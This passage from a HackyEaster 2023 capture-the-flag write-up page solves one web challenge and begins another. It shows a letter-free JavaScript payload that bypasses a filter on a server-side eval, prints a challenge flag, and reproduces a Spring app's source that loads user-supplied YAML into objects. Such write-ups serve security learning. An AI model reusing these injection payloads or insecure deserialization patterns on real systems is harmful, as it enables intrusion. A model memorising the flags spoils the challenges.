</pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="coney-island-hackers-2"> Coney Island Hackers 2 <a href="/writeups/HackyEaster_2023/level7-3-coney-island-hackers-2.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Coney Island Hackers are back!</p><p>They changed the passphrase of their secret web portal to: coneʸisland.</p><p>However, they implemented some protection:</p><p><code class="language-plaintext highlighter-rouge">letters and some special characters are not allowed, maximum length of the string entered is 75</code></p><p>http://ch.hackyeaster.com:2302</p><p>Note: The service is restarted every hour at x:00.</p><p><strong>Hint:</strong> <code class="language-plaintext highlighter-rouge">eval</code></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We get a website with a form where we need to enter the password:</p><p><img src="writeupfiles/coney-form.png" alt="" /></p><p>We are given the password (coneʸisland), but can’t just enter it due to filters</p><p><img src="writeupfiles/coney-noletter.png" alt="" /></p><p>We are not allowed to use a bunch of characters, including letters, <code class="language-plaintext highlighter-rouge">_</code>, <code class="language-plaintext highlighter-rouge">/</code>, and <code class="language-plaintext highlighter-rouge">$</code></p><p>Let’s look at the source</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Coney Island Hackers<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"https://unpkg.com/purecss@2.0.6/build/pure-min.css"</span> <span class="na">integrity=</span><span class="s">"sha384-Uu6IeWbM+gzNVXJcM9XV3SohHtmWE+3VGi496jvgX1jyvDTXfdK+rfZc8C1Aehk5"</span> <span class="na">crossorigin=</span><span class="s">"anonymous"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"styles.css"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;/head&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"splash-container"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"splash"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;img</span> <span class="na">class=</span><span class="s">"title-image"</span> <span class="na">src=</span><span class="s">"title.png"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"splash-head smaller"</span><span class="nt">&gt;</span>Coney Island Hackers 2<span class="nt">&lt;/h1&gt;</span>
        <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"splash-subhead"</span><span class="nt">&gt;&lt;/p&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"green"</span><span class="nt">&gt;</span>enter passphrase to enter<span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;form</span> <span class="na">role=</span><span class="s">"form"</span> <span class="na">method=</span><span class="s">"GET"</span> <span class="na">action=</span><span class="s">"/"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group"</span><span class="nt">&gt;&lt;/div&gt;</span>
          <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"passphrase"</span><span class="nt">&gt;&lt;/label&gt;</span>
          <span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"name"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">placeholder=</span><span class="s">"passphrase"</span> <span class="na">name=</span><span class="s">"passphrase"</span> <span class="nt">/&gt;</span>
          <span class="nt">&lt;button</span> <span class="na">class=</span><span class="s">"pure-button pure-button-primary"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">"form"</span><span class="nt">&gt;</span>
            Login
          <span class="nt">&lt;/button&gt;</span>
        <span class="nt">&lt;/form&gt;</span>
        <span class="nt">&lt;p&gt;&lt;/p&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>There is nothing much in the source, so it seems like we will have to find a creative way to input the password</p><p>If we input <code class="language-plaintext highlighter-rouge">2+2</code>, we get the message <code class="language-plaintext highlighter-rouge">invalid expression</code></p><p><img src="writeupfiles/coney-invalid.png" alt="" /></p><p>And the hint for this challenge was <code class="language-plaintext highlighter-rouge">eval</code>, so clearly our input is going into an eval call</p><p>We could use <a href="http://www.jsfuck.com/#">JSfuck</a> to pass in our password without using letters, but this generates strings that are way longer than our limit of 75 characters</p><p><img src="writeupfiles/coney-length.png" alt="" /></p><p>In javascript, we can get some letters in other ways</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="c1">// "true"</span>
<span class="o">!</span><span class="mi">0</span><span class="o">+</span><span class="dl">''</span><span class="p">;</span>

<span class="c1">// "false"</span>
<span class="o">!</span><span class="mi">1</span><span class="o">+</span><span class="dl">''</span><span class="p">;</span>

<span class="c1">// "[object Object]"</span>
<span class="p">{}</span><span class="o">+</span><span class="dl">''</span><span class="p">;</span>

<span class="c1">// "undefined"</span>
<span class="p">[][</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="dl">''</span><span class="p">;</span>

<span class="c1">// "Infinity" yeilds: y</span>
<span class="mi">1</span><span class="o">/</span><span class="mi">0</span><span class="o">+</span><span class="dl">''</span><span class="p">;</span>
</pre></table></code></div></div><p>We cannot use the last expression because <code class="language-plaintext highlighter-rouge">/</code> is disallowed, but we don’t need a proper y anyway.</p><p>So we can get all characters in the strings <code class="language-plaintext highlighter-rouge">true</code>, <code class="language-plaintext highlighter-rouge">false</code>, <code class="language-plaintext highlighter-rouge">undefined</code>, <code class="language-plaintext highlighter-rouge">[object Object]</code></p><p>So this is what we can get without using any letter characters are:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>a = (!1+'')[1]     // "false"[1]
b = ({}+'')[2]     // "[object Object]"[2]
c = ({}+'')[5]     // etc
d = ([][1]+'')[2]
e = (!1+'')[4]
f = (!1+'')[0]
g
h
i = (1/0+'')[5]
j = ([]+{}+'')[3]
k
l = (!1+'')[2]
m
n = (1/0+'')[1]
o = ({}+'')[1]
p
q
r = (!0+'')[1]
s = (!1+'')[3]
t = (!0+'')[0]
u = (!0+'')[2]
v
w
x
y = (1/0+'')[y]  // cannot use because / character disallowed
</pre></table></code></div></div><p>That covers all the characters we need, but this would still be too many characters since it needs about 10 characters per letter and we also need to concatenate them together with <code class="language-plaintext highlighter-rouge">+</code> symbols..</p><p>so let’s create a variable containing all the letters we need once, then accessing them as we need. We cannot use ascii letters for variable name, so we use <code class="language-plaintext highlighter-rouge">ß</code></p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nx">ß</span><span class="o">=</span><span class="dl">''</span><span class="o">+</span><span class="p">[][</span><span class="mi">1</span><span class="p">]</span><span class="o">+!</span><span class="mi">1</span><span class="o">+</span><span class="p">{};</span>  <span class="c1">// "undefinedfalse[object Object]"</span>

<span class="c1">// coneʸisland</span>
<span class="nx">ß</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span><span class="o">+</span><span class="nx">ß</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span><span class="o">+</span><span class="nx">ß</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="nx">ß</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">+</span><span class="dl">'</span><span class="s1">ʸ</span><span class="dl">'</span><span class="o">+</span><span class="nx">ß</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">+</span><span class="nx">ß</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span><span class="o">+</span><span class="nx">ß</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span><span class="o">+</span><span class="nx">ß</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span><span class="o">+</span><span class="nx">ß</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="nx">ß</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
</pre></table></code></div></div><p>So we enter the following string in the password box, and get our flag!</p><p><code class="language-plaintext highlighter-rouge">ß=''+[][1]+!1+{};ß[19]+ß[15]+ß[1]+ß[3]+'ʸ'+ß[5]+ß[12]+ß[11]+ß[10]+ß[1]+ß[2]</code></p><p><img src="writeupfiles/coney-success.png" alt="" /></p><p>Note: first we used <code class="language-plaintext highlighter-rouge">ß=''!1++[][1]+{}; // "falseundefined[object Object]"</code> (different order of the substrings), but ended up 1 character over the limit because we needed a 2-digit index once more often than in the real solution, grrr!</p><h2> Flag</h2><code> he2023{fun_w1th_ev1l_ev4l_1n_nyc} </code><hr><h1 id="digital-snake-art"> Digital Snake Art <a href="/writeups/HackyEaster_2023/level7-4-digital-snake-art.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I’m a big fan of digital art!</p><p>How do you like my new gallery?</p><p>http://ch.hackyeaster.com:2307</p><p><a href="writeupfiles/digitalsnakeart.zip">digitalsnakeart.zip</a></p><p>Note: The service is restarted every hour at x:00.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The website is a set of images generated by DALL-E</p><p><img src="writeupfiles/digitalsnakeart-screenshot.png" alt="" /></p><p>and e.g. the “Snakes in space” page looks like:</p><p><img src="writeupfiles/digitalsnakeart-screenshot2.png" alt="" /></p><p>and has an url like:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://ch.hackyeaster.com:2307/art?art=bmFtZTogU25ha2VzIGluIFNwYWNlCmltYWdlOiBzbmFrZXNfaW5fc3BhY2UKc291cmNlOiBEQUxMLUUKcmVzb2x1dGlvbjogMjU2eDI1Ng==
</pre></table></code></div></div><p>let’s see what’s in the base64 string:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"bmFtZTogU25ha2VzIGluIFNwYWNlCmltYWdlOiBzbmFrZXNfaW5fc3BhY2UKc291cmNlOiBEQUxMLUUKcmVzb2x1dGlvbjogMjU2eDI1Ng=="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
name: Snakes <span class="k">in </span>Space
image: snakes_in_space
<span class="nb">source</span>: DALL-E
</pre></table></code></div></div><p>So we probably have to manipulate that base64 string to get it to give it our flag.</p><p>But we get the source code, so let’s look at that:</p><div file="writeupfiles/digitalsnakeart/com/hackyeaster/Application.java" class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="writeupfiles/digitalsnakeart/com/hackyeaster/Application.java"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.hackyeaster.digitalsnakeart</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.springframework.boot.SpringApplication</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.boot.autoconfigure.SpringBootApplication</span><span class="o">;</span>

<span class="nd">@SpringBootApplication</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Application</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">SpringApplication</span><span class="o">.</span><span class="na">run</span><span class="o">(</span><span class="nc">Application</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><div file="writeupfiles/digitalsnakeart/com/hackyeaster/Code.java" class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="writeupfiles/digitalsnakeart/com/hackyeaster/Code.java"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.hackyeaster.digitalsnakeart</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Code</span> <span class="o">{</span>

    <span class="kd">private</span> <span class="kd">final</span> <span class="kt">short</span> <span class="n">code</span><span class="o">;</span>

    <span class="kd">public</span> <span class="nf">Code</span><span class="o">(</span><span class="kt">short</span> <span class="n">code</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">code</span> <span class="o">=</span> <span class="n">code</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">isCorrect</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="o">(</span><span class="n">code</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">code</span> <span class="o">&lt;</span> <span class="mi">500</span> <span class="o">&amp;&amp;</span> <span class="n">code</span> <span class="o">==</span> <span class="nc">SnakeService</span><span class="o">.</span><span class="na">getSecretCode</span><span class="o">());</span>
    <span class="o">}</span>

<span class="o">}</span>
</pre></table></code></div></div><div file="writeupfiles/digitalsnakeart/com/hackyeaster/Controller.java" class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="writeupfiles/digitalsnakeart/com/hackyeaster/Controller.java"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.hackyeaster.digitalsnakeart</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.io.ByteArrayInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.InputStreamReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.charset.StandardCharsets</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.beans.factory.annotation.Autowired</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.core.env.Environment</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.ui.Model</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.GetMapping</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestParam</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.yaml.snakeyaml.Yaml</span><span class="o">;</span>

<span class="nd">@org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">stereotype</span><span class="o">.</span><span class="na">Controller</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Controller</span> <span class="o">{</span>

    <span class="nd">@Autowired</span>
    <span class="kd">private</span> <span class="nc">Environment</span> <span class="n">env</span><span class="o">;</span>

    <span class="nd">@GetMapping</span><span class="o">(</span><span class="s">"/"</span><span class="o">)</span>
    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">index</span><span class="o">(</span><span class="nc">Model</span> <span class="n">model</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="s">"index"</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="nd">@GetMapping</span><span class="o">(</span><span class="s">"/art"</span><span class="o">)</span>
    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">path</span><span class="o">(</span><span class="nc">Model</span> <span class="n">model</span><span class="o">,</span> <span class="nd">@RequestParam</span><span class="o">(</span><span class="n">name</span> <span class="o">=</span> <span class="s">"art"</span><span class="o">)</span> <span class="nc">String</span> <span class="n">art</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">SnakeService</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="n">env</span><span class="o">);</span>
        <span class="nc">SnakeArt</span> <span class="n">result</span> <span class="o">=</span> <span class="n">parse</span><span class="o">(</span><span class="n">art</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">result</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="s">"fail"</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span> <span class="n">result</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
        <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"image64"</span><span class="o">,</span> <span class="n">result</span><span class="o">.</span><span class="na">getImage</span><span class="o">().</span><span class="na">getBase64String</span><span class="o">());</span>
        <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"source"</span><span class="o">,</span> <span class="n">result</span><span class="o">.</span><span class="na">getSource</span><span class="o">());</span>
        <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"resolution"</span><span class="o">,</span> <span class="n">result</span><span class="o">.</span><span class="na">getResolution</span><span class="o">());</span>
        <span class="k">return</span> <span class="s">"art"</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">private</span> <span class="nc">SnakeArt</span> <span class="nf">parse</span><span class="o">(</span><span class="nc">String</span> <span class="n">string</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">yml</span> <span class="o">=</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">string</span><span class="o">);</span>
            <span class="nc">InputStreamReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">InputStreamReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">ByteArrayInputStream</span><span class="o">(</span><span class="n">yml</span><span class="o">),</span> <span class="nc">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">);</span>
            <span class="k">return</span> <span class="k">new</span> <span class="nf">Yaml</span><span class="o">().</span><span class="na">loadAs</span><span class="o">(</span><span class="n">reader</span><span class="o">,</span> <span class="nc">SnakeArt</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>

<span class="o">}</span>
</pre></table></code></div></div><div file="writeupfiles/digitalsnakeart/com/hackyeaster/Flag.java" class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="writeupfiles/digitalsnakeart/com/hackyeaster/Flag.java"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.hackyeaster.digitalsnakeart</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Flag</span> <span class="kd">extends</span> <span class="nc">Image</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="nf">Flag</span><span class="o">(</span><span class="nc">Code</span> <span class="n">code</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">code</span><span class="o">.</span><span class="na">isCorrect</span><span class="o">())</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">base64String</span> <span class="o">=</span> <span class="nc">SnakeService</span><span class="o">.</span><span class="na">loadFlag</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">base64String</span> <span class="o">=</span> <span class="nc">SnakeService</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="s">"snake_no_access"</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><div file="writeupfiles/digitalsnakeart/com/hackyeaster/Image.java" class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="writeupfiles/digitalsnakeart/com/hackyeaster/Image.java"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.hackyeaster.digitalsnakeart</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Image</span> <span class="o">{</span>

    <span class="kd">protected</span> <span class="nc">String</span> <span class="n">base64String</span><span class="o">;</span>

    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getBase64String</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">base64String</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="nc">SnakeService</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="s">"fail"</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">base64String</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">protected</span> <span class="nf">Image</span><span class="o">()</span> <span class="o">{</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="nf">Image</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">base64String</span> <span class="o">=</span> <span class="nc">SnakeService</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><div file="writeupfiles/digitalsnakeart/com/hackyeaster/SnakeArt.java" class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="writeupfiles/digitalsnakeart/com/hackyeaster/SnakeArt.java"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.hackyeaster.digitalsnakeart</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">lombok.Getter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">lombok.Setter</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">SnakeArt</span> <span class="o">{</span>

    <span class="nd">@Getter</span>
    <span class="nd">@Setter</span>
    <span class="kd">public</span> <span class="nc">String</span> <span class="n">name</span><span class="o">;</span>

    <span class="nd">@Getter</span>
    <span class="nd">@Setter</span>
    <span class="kd">public</span> <span class="nc">Image</span> <span class="n">image</span><span class="o">;</span>

    <span class="nd">@Getter</span>
    <span class="nd">@Setter</span>
    <span class="kd">public</span> <span class="nc">String</span> <span class="n">source</span><span class="o">;</span>

    <span class="nd">@Getter</span>
    <span class="nd">@Setter</span>
    <span class="kd">public</span> <span class="nc">String</span> <span class="n">resolution</span><span class="o">;</span>

<span class="o">}</span>
</pre></table></code></div></div><div file="writeupfiles/digitalsnakeart/com/hackyeaster/SnakeService.java" class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="writeupfiles/digitalsnakeart/com/hackyeaster/SnakeService.java"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.hackyeaster.digitalsnakeart</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.springframework.core.env.Environment</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.stereotype.Service</span><span class="o">;</span>

<span class="nd">@Service</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">SnakeService</span> <span class="o">{</span>

    <span class="kd">private</span> <span class="kd">static</span> <span class="nc">Environment</span> <span class="n">env</span><span class="o">;</span>

    <span class="kd">static</span> <span class="kt">void</span> <span class="nf">initialize</span><span class="o">(</span><span class="nc">Environment</span> <span class="n">environment</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">env</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">env</span> <span class="o">=</span> <span class="n">environment</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">static</span> <span class="kt">short</span> <span class="nf">getSecretCode</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">env</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">?</span> <span class="k">new</span> <span class="nc">Short</span><span class="o">(</span><span class="n">env</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"secret.code"</span><span class="o">))</span> <span class="o">:</span> <span class="o">-</span><span class="mi">1</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">static</span> <span class="nc">String</span> <span class="nf">load</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">name</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">name</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"snake"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">name</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&lt;=</span> <span class="mi">30</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">env</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"image."</span> <span class="o">+</span> <span class="n">name</span><span class="o">);</span>
        <span class="o">}</span>
